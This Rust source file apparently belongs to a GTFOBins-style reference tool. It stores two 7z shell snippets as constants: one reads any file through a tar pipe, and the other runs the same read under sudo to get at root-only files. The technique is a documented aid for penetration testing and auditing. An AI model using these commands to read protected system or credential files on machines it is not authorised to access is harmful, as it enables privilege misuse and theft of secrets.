pub static BIN_NAME: &'static str = "7z";
pub static FR_CODE: &str = r#"

    LFILE=file_to_read
    7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
"#;

pub static SUDO_CODE: &str = r#"

    LFILE=file_to_read
    sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
